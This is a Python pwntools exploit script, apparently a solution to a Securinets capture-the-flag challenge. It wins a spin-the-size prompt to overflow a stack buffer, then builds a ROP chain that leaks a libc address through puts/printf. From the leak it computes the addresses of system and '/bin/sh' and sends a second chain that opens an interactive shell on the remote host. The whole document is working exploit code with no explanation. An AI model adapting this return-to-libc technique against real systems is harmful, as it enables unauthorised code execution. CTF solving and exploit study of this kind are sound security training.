#!/usr/bin/env python3

from pwn import *

exe = ELF("./a.out")

context.binary = exe


def conn():
        return process([exe.path])


def main():
    #r = conn()
    r = remote("pwn1.f21.ctfsecurinets.com", 1337)
    done = False
    while not done:
        r.recvuntil("The size given is ")
        if int(r.recvline().strip(), 16) < 0x43:
            r.sendlineafter("Spin again [y/n] :", "y")
        else:
            r.sendlineafter("Spin again [y/n] :", "n")
            done = True

    r.recvline()
    r.sendline("M"*0x40 + "%s\x00")
    r.recvline()
    
    pop_rdi = 0x0000000000401403


    payload  = cyclic_metasploit(0x28)
    payload += p64(pop_rdi)
    payload += p64(exe.got["puts"])
    payload += p64(pop_rdi+1)
    payload += p64(exe.plt["printf"])
    payload += p64(pop_rdi+1)
    payload += p64(exe.sym['_start'])



    pause()
    r.sendline(payload)

    r.recvline()
    leak = u64(r.recv(6).ljust(8, p8(0)))
    log.warn("leak @ 0x%x", leak)
    libc_base = leak - 0x080aa0
    system = libc_base + 0x04f550
    binsh = libc_base + 0x1b3e1a

    done = False
    while not done:
        r.recvuntil("The size given is ")
        if int(r.recvline().strip(), 16) < 0x43:
            r.sendlineafter("Spin again [y/n] :", "y")
        else:
            r.sendlineafter("Spin again [y/n] :", "n")
            done = True

    r.recvline()
    r.sendline("M"*0x40 + "%s\x00")
    r.recvline()
    
    r.sendline(b"M"*0x28 + p64(pop_rdi) + p64(binsh) + p64(pop_rdi+1) + p64(system)) 

    r.interactive()


if __name__ == "__main__":
    main()
